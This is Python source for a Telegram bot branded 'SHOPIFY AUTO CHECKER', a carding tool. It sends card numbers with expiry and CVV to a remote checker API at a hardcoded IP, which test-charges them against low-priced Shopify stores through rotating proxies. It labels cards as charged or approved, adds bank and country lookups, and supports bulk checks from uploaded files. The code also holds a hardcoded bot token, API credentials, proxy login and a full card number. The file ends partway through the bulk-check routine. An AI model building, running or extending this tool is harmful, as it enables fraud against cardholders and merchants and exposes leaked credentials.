import aiohttp
import httpx
import aiohttp
import aiofiles
import asyncio
import os
import random
import time
import json
import re
from datetime import datetime
from telethon import TelegramClient, events, Button



from telethon.errors import FloodWaitError

_last_send_time = [0]
_send_lock = asyncio.Lock()

async def safe_respond(event, text, **kwargs):
    async with _send_lock:
        now = time.time()
        diff = now - _last_send_time[0]
        if diff < 1.2:
            await asyncio.sleep(1.2 - diff)
        _last_send_time[0] = time.time()
        
    for attempt in range(2):
        try:
            return await event.respond(text, **kwargs)
        except FloodWaitError as e:
            if e.seconds > 60:
                print(f"CRITICAL: Telegram FloodWait of {e.seconds}s! Bot token is rate-limited.")
                return None
            print(f"FloodWait hit! Sleeping for {e.seconds} seconds...")
            await asyncio.sleep(e.seconds)
        except Exception as ex:
            print(f"Send error: {ex}")
            return None
    return None

async def safe_edit(msg, text, **kwargs):
    try:
        return await msg.edit(text, **kwargs)
    except FloodWaitError as e:
        if e.seconds > 60:
            return None
        await asyncio.sleep(2)
        try:
            return await msg.edit(text, **kwargs)
        except Exception:
            return None
    except Exception:
        return None



API_ID = 37935809
API_HASH = '1d3dd003e3fed2f81a2eeb1a1436567a'
BOT_TOKEN = '8822269103:AAE3yUcxj4uWPEarNhh29aPLnWh5olMjypc'
ADMIN_ID = [7352706784]

def load_authorized_users():
    users = set(ADMIN_ID)
    if os.path.exists(PREMIUM_USERS_FILE):
        try:
            with open(PREMIUM_USERS_FILE, 'r') as f:
                for line in f:
                    if line.strip().isdigit():
                        users.add(int(line.strip()))
        except: pass
    return users

def is_authorized(user_id):
    return user_id in load_authorized_users()

# Updated API URL
CHECKER_API_URL = 'http://5.175.140.23:5000/shopify'
SITE_CHECK_CC = '5516220003104825|06|2029|253'
SITE_CHECK_PROXY = 'px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

bot = TelegramClient('shopify_auto_v4', API_ID, API_HASH)

_http_session = None

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ssl=False),
            timeout=aiohttp.ClientTimeout(total=45)
        )
    return _http_session

active_sessions = {}
retry_sessions = {}
user_price_selection = {}
sites_lock = asyncio.Lock()

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724", "😺": "5118590136149345664",
    "🌍": "5303440357428586778", "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "📥": "5350747347724810871", "💵": "5350711759625795085",
    "📂": "5444908424015934570", "🛠️": "5348239232852836489", "🟢": "5444987348334965906",
    "🟠": "5116414868357907335", "🔴": "5447647474984449520", "🟡": "5447610606402241697",
    "️🏷️": "5436285465420383204", "📄️": "5323538339062628165"
}

def premium_emoji(text: str) -> str:
    if not text: return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_file_lines(filepath):
    if not os.path.exists(filepath): return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_sites_detailed():
    lines = get_file_lines(SITES_FILE)
    sites = []
    for line in lines:
        parts = line.split('|')
        url = parts[0].strip()
        price = 1.0
        if len(parts) > 1:
            price = parse_price_val(parts[1])
        sites.append({'url': url, 'price': price})
    return sites

def load_sites():
    return [s['url'] for s in load_sites_detailed()]

def load_proxies():
    return get_file_lines(PROXY_FILE)

def parse_price_val(price_str):
    try:
        clean = re.sub(r'[^\d.]', '', str(price_str))
        return float(clean)
    except:
        return 1.0

async def get_lowest_shopify_price(url, proxy=None):
    try:
        if not url.startswith('http'): url = f'https://{url}'
        target = f"{url.rstrip('/')}/products.json"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
        proxy_url = f"http://{proxy}" if proxy and '://' not in proxy else proxy
        session = await get_http_session()
        async with session.get(target, proxy=proxy_url, headers=headers, timeout=10) as resp:
            if resp.status == 200:
                data = await resp.json()
                prices = []
                for product in data.get('products', []):
                    for variant in product.get('variants', []):
                        p = variant.get('price')
                        if p:
                            try:
                                val = float(p)
                                if val >= 0: prices.append(val)
                            except: pass
                if prices: return min(prices)
    except: pass
    return 1.0

async def remove_dead_site(url):
    async with sites_lock:
        try:
            if not os.path.exists(SITES_FILE): return
            async with aiofiles.open(SITES_FILE, mode='r') as f:
                lines = await f.readlines()
            
            url_clean = url.lower().rstrip('/')
            new_lines = []
            removed = False
            for line in lines:
                if line.strip() and line.split('|')[0].lower().rstrip('/') != url_clean:
                    new_lines.append(line)
                else:
                    removed = True
            
            if removed:
                async with aiofiles.open(SITES_FILE, mode='w') as f:
                    await f.writelines(new_lines)
        except Exception as e:
            print(f"Error removing dead site {url}: {e}")

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10) as res:
                if res.status == 200:
                    data = await res.json()
                    return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
    except:
        pass
    return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def extract_proxies(text):
    proxies = []
    pattern = r'(?:[a-zA-Z0-9.-]+:[0-9]+:[a-zA-Z0-9.-]+:[a-zA-Z0-9.-]+|[a-zA-Z0-9.-]+:[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+:[0-9]+|[a-zA-Z0-9.-]+:[0-9]+)'
    matches = re.findall(pattern, text)
    for m in matches:
        if m.count(':') >= 1:
            proxies.append(m.strip())
    return list(dict.fromkeys(proxies))

def extract_sites(text):
    pattern = r'(https?://[a-zA-Z0-9.-]+(?:\.myshopify\.com|[a-zA-Z0-9-]+\.[a-z]{2,}))'
    sites = re.findall(pattern, text)
    results = {}
    for site in sites:
        site = site.lower().rstrip('/')
        if '.myshopify.com' not in site and not any(k in site for k in ['shop', 'store', 'market', 'cart']):
            continue
        if site in results: continue
        results[site] = "1.0"
    return [f"{s}|{p}" for s, p in results.items()]

async def check_card(card, site, proxy=None, price=None):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid format', 'card': card}
        if not site.startswith('http'): site = f'https://{site}'
        
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if price: url += f'&price={price}'
        if proxy:
            p_clean = proxy.strip()
            if '@' in p_clean:
                proxy_str = p_clean
            elif p_clean.count(':') == 3:
                parts = p_clean.split(':')
                if len(parts[0]) <= 5: # user:pass:ip:port
                    user, pwd, ip, port = parts
                    proxy_str = f"{user}:{pwd}@{ip}:{port}"
                else: # ip:port:user:pass
                    ip, port, user, pwd = parts
                    proxy_str = f"{user}:{pwd}@{ip}:{port}"
            else:
                proxy_str = p_clean
            url += f'&proxy={proxy_str}'
        
        session = await get_http_session()
        async with session.get(url) as resp:
            status_code = resp.status
            if resp.status != 200:
                return {'status': 'Error', 'message': 'Site Error!', 'status_code': status_code, 'card': card, 'retry': True}
            raw = await resp.json()
                
        resp_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gateway = raw.get('Gate', raw.get('Gateway', 'Shopify'))
        resp_lower = resp_msg.lower()
        
        if any(k in resp_lower for k in ['charged', 'order_placed', 'thank you', 'payment successful', 'success']):
            return {'status': 'Charged', 'message': resp_msg, 'status_code': status_code, 'card': card, 'gateway': gateway, 'price': price}
        elif any(k in resp_lower for k in ['approved', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', '3d', 'otp', 'verification required', 'authenticate']):
            return {'status': 'Approved', 'message': resp_msg, 'status_code': status_code, 'card': card, 'gateway': gateway, 'price': price}
        elif any(k in resp_lower for k in ['error', '429', 'failed', 'timeout', 'blocked', 'captcha', 'cloudflare']):
            return {'status': 'Error', 'message': resp_msg, 'status_code': status_code, 'card': card, 'gateway': gateway, 'price': price}
        else:
            return {'status': 'Declined', 'message': resp_msg, 'status_code': status_code, 'card': card, 'gateway': gateway, 'price': price}
    except Exception as e:
        return {'status': 'Error', 'message': str(e), 'status_code': 'Error', 'card': card, 'gateway': 'Shopify', 'price': '-'}

@bot.on(events.NewMessage(pattern=r'/(chksite|sites)'))
async def chksite_cmd(event):
    if not is_authorized(event.sender_id):
        return await event.reply("❌ You are not authorized to use this bot!")
    sites = load_sites_detailed()
    if not sites:
        return await event.reply("❌ No sites loaded in database!")
    
    msg = await event.reply(premium_emoji(f"🌐 <b>VERIFYING SITES (LIVE)...</b>"), parse_mode='html')
    proxies = load_proxies()
    
    working_sites, dead_count = [], 0
    checked_count = 0
    total_sites = len(sites)
    latest_info = "Waiting..."
    test_cc = SITE_CHECK_CC
    test_proxy = SITE_CHECK_PROXY
    queue = asyncio.Queue()
    for s in sites: queue.put_nowait(s)
    
    last_update = [0]
    async def worker():
        nonlocal dead_count, checked_count, latest_info
        while True:
            try:
                s = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            checked_count += 1
            # Use provided proxy for site verification
            proxy = test_proxy
            
            # Refresh lowest price during site check
            try:
                new_price = await asyncio.wait_for(get_lowest_shopify_price(url=s['url'], proxy=proxy), timeout=15)
            except:
                new_price = None
            
            # Keep only sites between 0 and 15 dollar
            if new_price is None or new_price > 15.0:
                await remove_dead_site(s['url'])
                dead_count += 1
                reason = "Price > $15" if new_price and new_price > 15.0 else "Invalid Site/Price"
                latest_info = f"✖ {s['url'].replace('https://','').replace('http://','')} → {reason} (Removed)"
                queue.task_done()
                continue

            try:
                res = await asyncio.wait_for(check_card(test_cc, s['url'], proxy=proxy, price=new_price), timeout=25)
            except:
                res = {'status': 'Error', 'message': 'Timeout'}
                
            url_clean = s['url'].replace('https://','').replace('http://','')
            status_code = res.get('status_code', '???')
            res_msg = res.get('message', 'No Response')
            
            msg_lower = str(res_msg).lower()
            if any(k in msg_lower for k in ['declined', 'order', 'success', 'funds', 'cvv', '3d', 'auth', 'expired']):
                working_sites.append(f"{s['url']}|{new_price}")
                latest_info = f"✔ {url_clean} → {res_msg}\nStatus: {status_code}"
            else:
                await remove_dead_site(s['url'])
                dead_count += 1
                latest_info = f"✖ {url_clean} → {res_msg} (Removed)"
            
            queue.task_done()
            now = time.time()
            if now - last_update[0] >= 5.0 or checked_count >= total_sites:
                last_update[0] = now
                dash = f"""🌐 <b>VERIFYING SITES (LIVE)...</b>
- - - - - - - - - - - - - - - - - - - - - - -
✔ <b>Live Sites:</b> {len(working_sites)}
✖ <b>Dead Sites:</b> {dead_count}
⏳ <b>Progress:</b> {checked_count}/{total_sites}
💬 <b>Latest:</b> {latest_info}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
                asyncio.create_task(safe_edit(msg, premium_emoji(dash), parse_mode='html'))

    tasks = [asyncio.create_task(worker()) for _ in range(50)]
    await asyncio.gather(*tasks)
            
    with open(SITES_FILE, 'w') as f:
        for ws in working_sites: f.write(ws + "\n")
            
    final_dash = f"""🧹 <b>Site Check Complete!</b>
- - - - - - - - - - - - - - - - - - - - - - -
✔ <b>Working Sites:</b> {len(working_sites)}
✖ <b>Removed Dead Sites:</b> {dead_count}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
    await event.respond(premium_emoji(final_dash), parse_mode='html')
    try: await msg.delete()
    except: pass

@bot.on(events.NewMessage(pattern=r'/id'))
async def id_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ Only the admin can add users!")
    args = event.text.split()
    if len(args) < 2:
        return await event.reply("❌ Usage: `/id [user_id]`")
    target_id = args[1].strip()
    if not target_id.isdigit():
        return await event.reply("❌ Invalid user ID!")
    
    users = load_authorized_users()
    users.add(int(target_id))
    with open(PREMIUM_USERS_FILE, 'w') as f:
        for uid in users:
            if uid not in ADMIN_ID:
                f.write(f"{uid}\n")
    await event.reply(f"✅ User <code>{target_id}</code> added successfully!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        return await event.reply("❌ You are not authorized to use this bot! Ask admin for access.")
    welcome = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 <b>SHOPIFY AUTO CHECKER</b> 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 <b>Welcome to SHOPIFY AUTO CHECKER!</b>
💡 <b>Commands Menu:</b>
🌐 <code>/site [urls]</code> - <b>Add & verify Shopify sites</b>
🌐 <code>/rmsites [all/url]</code> - <b>Remove saved sites</b>
🌐 <code>/file</code> - <b>Clean & add sites from text/file</b>
🔌 <code>/px [proxies]</code> - <b>Add residential proxies</b>
🔌 <code>/rmpx [all/num]</code> - <b>Remove saved proxies</b>
🔌 <code>/chkpx</code> - <b>Check proxy speed & status</b>
🔌 <code>/proxy [list]</code> - <b>Test proxy list instantly</b>
🔌 <code>/clean</code> - <b>Clean & add proxies from text/file</b> 

	💳 <code>/sh [cc]</code> - <b>Check single credit card</b>
	📁 <code>/msh</code> - <b>Bulk check file (reply to .txt)</b>
	📊 <code>/stats</code> - <b>View checker statistics</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌤ <b>𝐃𝐞𝐯 𝐛𝐲: @XVNZX - 🍀</b>"""
    buttons = [
        [Button.url("📢 Official Channel", "https://t.me/+dipP_wYkO2Q4MmJh")],
        [Button.url("👑 Developer: @XVNZX", "https://t.me/XVNZX")]
    ]
    await event.reply(premium_emoji(welcome), buttons=buttons, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/(clean|px)'))
async def clean_proxies_cmd(event):
    text = ""
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply.file:
            path = await bot.download_media(reply)
            with open(path, "r", encoding="utf-8", errors="ignore") as f: text = f.read()
            os.remove(path)
        else: text = reply.text
    else:
        text = event.text.replace('/clean', '').replace('/px', '').strip()
    
    if not text: return await event.reply("❌ Usage: `/px [proxies]` or reply to a file.")
    
    proxies = extract_proxies(text)
    if not proxies: return await event.reply("❌ No valid proxies found!")
    
    existing = set(load_proxies())
    new_px = [p for p in proxies if p not in existing]
    
    if not new_px: return await event.reply("❌ All proxies are already in the database!")
    
    with open(PROXY_FILE, "a", encoding="utf-8") as f:
        for p in new_px: f.write(p + "\n")
    
    await event.reply(premium_emoji(f"✅ <b>Added:</b> {len(new_px)} new proxies."), parse_mode='html')

async def perform_proxy_check(event, proxies):
    msg = await event.reply(premium_emoji(f"⚡ <b>Testing {len(proxies)} proxies...</b>"), parse_mode='html')
    working_list, dead_list = [], []
    
    async def check_one(px):
        try:
            if px.count(':') == 3:
                ip, port, user, pwd = px.split(':')
                proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
            else:
                proxy_url = f"http://{px}"
                
            async with aiohttp.ClientSession() as session:
                start = time.time()
                async with session.get("http://google.com", proxy=proxy_url, timeout=10) as r:
                    if r.status == 200:
                        working_list.append(f"{px} | {int((time.time()-start)*1000)}ms")
                    else: dead_list.append(px)
        except: dead_list.append(px)

    tasks = [asyncio.create_task(check_one(p)) for p in proxies]
    await asyncio.gather(*tasks)
    
    w_file, d_file = "working_px.txt", "dead_px.txt"
    files_to_send = []
    if working_list:
        with open(w_file, "w") as f: f.write("\n".join(working_list))
        files_to_send.append(w_file)
    if dead_list:
        with open(d_file, "w") as f: f.write("\n".join(dead_list))
        files_to_send.append(d_file)
        
    summary = f"""🔌 <b>PROXY CHECK COMPLETE</b>
- - - - - - - - - - - - - - - - - - - - - - -
🟢 Working: {len(working_list)}
🔴 Dead: {len(dead_list)}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ 𝐃𝐞𝐯 by: @XVNZX - 🍀"""
    
    if files_to_send:
        await safe_respond(event, premium_emoji(summary), file=files_to_send, parse_mode='html')
    else:
        await safe_respond(event, premium_emoji(summary), parse_mode='html')
        
    for f in [w_file, d_file]:
        try:
            if os.path.exists(f): os.remove(f)
        except: pass
    await msg.delete()

@bot.on(events.NewMessage(pattern=r'/chkpx'))
async def chkpx_cmd(event):
    proxies = load_proxies()
    if not proxies: return await event.reply("❌ No proxies loaded!")
    await perform_proxy_check(event, proxies)

@bot.on(events.NewMessage(pattern=r'/proxy'))
async def proxy_cmd(event):
    text = ""
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply.file:
            path = await bot.download_media(reply)
            with open(path, "r", encoding="utf-8", errors="ignore") as f: text = f.read()
            os.remove(path)
        else: text = reply.text
    else: text = event.text.replace('/proxy', '').strip()
    
    proxies = extract_proxies(text)
    if not proxies: return await event.reply("❌ No proxies found! Usage: `/proxy [list]` or reply to file.")
    await perform_proxy_check(event, proxies)

@bot.on(events.NewMessage(pattern=r'/rmpx'))
async def rmpx_cmd(event):
    text = event.text.replace('/rmpx', '').strip()
    proxies = load_proxies()
    if not proxies: return await event.reply("❌ No proxies loaded!")
    if text.lower() == 'all':
        open(PROXY_FILE, 'w').close()
        await event.reply(premium_emoji("✅ All proxies removed!"), parse_mode='html')
    elif text.isdigit():
        idx = int(text) - 1
        if 0 <= idx < len(proxies):
            rem = proxies.pop(idx)
            with open(PROXY_FILE, 'w') as f: f.write("\n".join(proxies) + "\n" if proxies else "")
            await event.reply(premium_emoji(f"✅ Removed: <code>{rem}</code>"), parse_mode='html')
        else: await event.reply("❌ Invalid index!")
    else: await event.reply("❌ Usage: `/rmpx all` or `/rmpx [num]`")

@bot.on(events.NewMessage(pattern=r'/rmsites'))
async def rmsites_cmd(event):
    text = event.text.replace('/rmsites', '').strip()
    sites = load_sites_detailed()
    if not sites: return await event.reply("❌ No sites loaded!")
    if text.lower() == 'all':
        open(SITES_FILE, 'w').close()
        await event.reply(premium_emoji("✅ All sites removed!"), parse_mode='html')
    elif text:
        new = [s for s in sites if text.lower() not in s['url'].lower()]
        with open(SITES_FILE, 'w') as f:
            for s in new: f.write(f"{s['url']}|{s['price']}\n")
        await event.reply(premium_emoji(f"✅ Removed sites matching: {text}"), parse_mode='html')
    else: await event.reply("❌ Usage: `/rmsites all` or `/rmsites [url]`")

@bot.on(events.NewMessage(pattern=r'/site'))
async def site_cmd(event):
    text = ""
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply.file:
            path = await bot.download_media(reply)
            with open(path, "r", encoding="utf-8", errors="ignore") as f: text = f.read()
            os.remove(path)
        else: text = reply.text
    else: text = event.text.replace('/site', '').strip()
    
    extracted = extract_sites(text)
    raw_list = [s.split('|')[0] for s in extracted] if extracted else [s.strip() for s in re.split(r'\s+', text) if s.strip()]
    
    existing = set(load_sites())
    unique_input = []
    seen_in_input = set()
    for u in raw_list:
        u_low = u.lower().rstrip('/')
        if u_low not in existing and u_low not in seen_in_input:
            unique_input.append(u)
            seen_in_input.add(u_low)
            
    if not unique_input: 
        return await event.reply("❌ All provided sites are already in the database or duplicated!")
    
    msg = await event.reply(premium_emoji(f"🌐 <b>VERIFYING SITES (LIVE)...</b>"), parse_mode='html')
    valid, refused = [], []
    test_cc = SITE_CHECK_CC
    test_proxy = SITE_CHECK_PROXY
    queue = asyncio.Queue()
    for u in unique_input: queue.put_nowait(u)
    
    checked_count, last_update = [0], [0]
    latest_resp = ["Initializing..."]
    
    async def worker():
        while not queue.empty():
            try: url = queue.get_nowait()
            except: break
            proxy = test_proxy
            price = await get_lowest_shopify_price(url, proxy=proxy)
            
            url_clean = url.replace('https://', '').replace('http://', '')
            if price is None or price > 15.0:
                refused.append(f"{url} | Price > $15 or Dead")
                latest_resp[0] = f"✖ {url_clean} → Price > $15 (Skipped)"
            else:
                res = await check_card(test_cc, url, proxy=proxy, price=price)
                msg_res = res.get('message', 'Error')
                status_code = res.get('status_code', '???')
                msg_lower = str(msg_res).lower()
                if any(k in msg_lower for k in ['declined', 'order', 'success', 'funds', 'cvv', '3d', 'auth', 'expired']):
                    valid.append(f"{url}|{price}")
                    with open(SITES_FILE, "a") as f: f.write(f"{url}|{price}\n")
                    latest_resp[0] = f"✔ {url_clean} → LIVE (${price})\nStatus: {status_code}"
                else:
                    refused.append(f"{url} | {msg_res}")
                    latest_resp[0] = f"✖ {url_clean} → {msg_res}\nStatus: {status_code}"
            
            checked_count[0] += 1
            queue.task_done()
            now = time.time()
            if now - last_update[0] >= 3.0 or checked_count[0] == len(unique_input):
                last_update[0] = now
                try:
                    prog = f"""🌐 <b>VERIFYING SITES (LIVE)...</b>
- - - - - - - - - - - - - - - - - - - - - - -
✔ <b>Live Sites:</b> {len(valid)}
✖ <b>Dead Sites:</b> {len(refused)}
⏳ <b>Progress:</b> {checked_count[0]}/{len(unique_input)}
💬 <b>Latest:</b> {latest_resp[0]}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
                    await msg.edit(premium_emoji(prog), parse_mode='html')
                except: pass

    tasks = [asyncio.create_task(worker()) for _ in range(50)]
    await asyncio.gather(*tasks)
            
    w_file, r_file = f"working_{int(time.time())}.txt", f"refused_{int(time.time())}.txt"
    with open(w_file, "w") as f: f.write("\n".join(valid))
    with open(r_file, "w") as f: f.write("\n".join(refused))
    
    final_dash = f"""✅ <b>Verification Done!</b>
- - - - - - - - - - - - - - - - - - - - - - -
✔ <b>Live:</b> {len(valid)}
✖ <b>Dead:</b> {len(refused)}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
    await event.respond(premium_emoji(final_dash), file=[w_file, r_file], parse_mode='html')
    for f in [w_file, r_file]: os.remove(f)
    try: await msg.delete()
    except: pass

@bot.on(events.NewMessage(pattern=r'/sh'))
async def sh_cmd(event):
    proxies = load_proxies()
    if not proxies: return await event.reply("❌ No proxies found!")
    args = event.text.split()
    if len(args) < 2: return await event.reply("❌ Usage: `/sh [cc]`")
    cc = args[1]
    
    checked_sites = set()
    max_retries = 5
    status_msg = await event.reply(premium_emoji(f"⏳ Initializing single check for <code>{cc}</code>..."), parse_mode='html')
    
    async def fast_worker(site_obj):
        target_site = site_obj['url']
        proxy = random.choice(proxies) if proxies else None
        res = await check_card(cc, target_site, proxy=proxy, price=site_obj['price'])
        actual_price = parse_price_val(str(res.get('price', site_obj['price'])))
        if actual_price > 15.0:
            await remove_dead_site(target_site)
            return None
        status = res['status']
        if status == 'Error':
            if res.get('status_code') not in [429, 403]:
                await remove_dead_site(target_site)
            return None
        return (res, site_obj)

    for _ in range(max_retries):
        sites = load_sites_detailed()
        # Filter sites between 0 and 15 dollar for /sh
        valid_sites = [s for s in sites if 0 <= s['price'] <= 15.0 and s['url'] not in checked_sites]
        if not valid_sites:
            await safe_edit(status_msg, premium_emoji("❌ No sites under $15 found!"))
            return
            
        # Pick up to 3 sites to check in parallel
        targets = random.sample(valid_sites, min(len(valid_sites), 3))
        for t in targets: checked_sites.add(t['url'])
        
        try: 
            # Status message: ⏳ Fast Checking {cc} without site name
            await safe_edit(status_msg, premium_emoji(f"⏳ Fast Checking <code>{cc}</code>"), parse_mode='html')
        except: pass
        
        tasks = [asyncio.create_task(fast_worker(t)) for t in targets]
        done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
        
        success_res = None
        for task in done:
            result = task.result()
            if result:
                success_res = result
                break
        
        if success_res:
            # Cancel other pending tasks
            for p in pending: p.cancel()
            res, target_obj = success_res
            brand, btype, level, bank, country, flag = await get_bin_info(cc)
            status = res['status']
            emoji = "🔥" if status == "Charged" else ("✅" if status == "Approved" else "❌")
            text = f"""<b>🔹 SHOPIFY {status.upper()}</b> {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
💳 <b>Card:</b> <code>{cc}</code>
📝 <b>Status:</b> <code>{res['message']}</code>
💰 <b>Price:</b> <code>{res.get('price', target_obj['price'])}</code>
- - - - - - - - - - - - - - - - - - - - - - -
ℹ️ <b>BIN Info:</b> {brand} - {btype} - {level}
🏦 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} {flag}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
            result_msg = await safe_respond(event, premium_emoji(text), parse_mode='html')
            if status == 'Charged':
                try: await bot.pin_message(event.chat_id, result_msg)
                except: pass
            try: await status_msg.delete()
            except: pass
            return
        
        # If all parallel tasks failed, wait for remaining tasks in this batch before retrying
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
    
    await safe_edit(status_msg, premium_emoji("❌ Failed to find a valid site under $15 after attempts."))

@bot.on(events.NewMessage(pattern=r'/msh'))
async def msh_cmd(event):
    proxies = load_proxies()
    if not proxies: return await event.reply("❌ No proxies found!")
    if not event.reply_to_msg_id: return await event.reply("❌ Reply to a .txt file containing cards!")
    reply = await event.get_reply_message()
    if not reply.file: return await event.reply("❌ Reply to a valid file!")
    
    sites = load_sites_detailed()
    valid_sites = [s for s in sites if s['price'] <= 15.0]
    if not valid_sites: return await event.reply("❌ No sites under $15 loaded!")
    
    path = await bot.download_media(reply)
    with open(path, "r", encoding="utf-8", errors="ignore") as f: cards = extract_cc(f.read())
    os.remove(path)
    if not cards: return await event.reply("❌ No valid cards found!")
    
    user_id = event.sender_id
    dashboard_msg = await event.respond(premium_emoji(f"🚀 Initializing bulk check on <b>{len(valid_sites)}</b> sites..."), parse_mode='html')
    
    active_sessions[user_id] = {
        'charged': 0, 'approved': 0, 'declined': 0, 'errors': 0, 'checked': 0,
        'hit_list': [], 'error_cards': [], 'start_time': time.time(),
        'cancelled': False, 'tasks': [], 'last_update': 0,
        'dashboard_msg': dashboard_msg, 'f_sites': valid_sites
    }
    session = active_sessions[user_id]
    
    total = len(cards)
    queue = asyncio.Queue()
    for i, cc in enumerate(cards): queue.put_nowait((i, cc))
    update_lock = asyncio.Lock()
    
    async def worker():
        while not session.get('cancelled'):
            try:
                try:
                    idx, cc = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                if not valid_sites:
                    session['errors'] += 1
                    session['checked'] += 1
                    continue
                    
                target_obj = valid_sites[idx % len(valid_sites)]
                site = target_obj['url']
                proxy = proxies[idx % len(proxies)] if proxies else None
                
                try:
                    res = await asyncio.wait_for(check_card(cc, site, proxy=proxy, price=target_obj['price']), timeout=25)
                except asyncio.TimeoutError:
                    res = {'status': 'Error', 'message': 'Timeout'}
                except Exception as e:
                    res = {'status': 'Error', 'message': str(e)}

                actual_price = parse_price_val(str(res.get('price', target_obj['price'])))
                
                if actual_price > 15.0:
                    await remove_dead_site(site)
                    if target_obj in valid_sites:
                        valid_sites.remove(target_obj)
                    # Try to find a new site for this card
                    if valid_sites:
                        queue.put_nowait((idx, cc))
                    else:
                        session['errors'] += 1
                        session['checked'] += 1
                    continue

                if session.get('cancelled'): break
                status = res['status']
                res_msg = str(res.get('message', 'No Response'))
                res_price = res.get('price', target_obj['price'])
                
                if status == 'Charged': session['charged'] += 1
                elif status == 'Approved': session['approved'] += 1
                elif status == 'Error': 
                    session['errors'] += 1
                    session['error_cards'].append(cc)
                    if res.get('status_code') not in [429, 403]: 
                        await remove_dead_site(site)
                        if target_obj in valid_sites:
                            valid_sites.remove(target_obj)
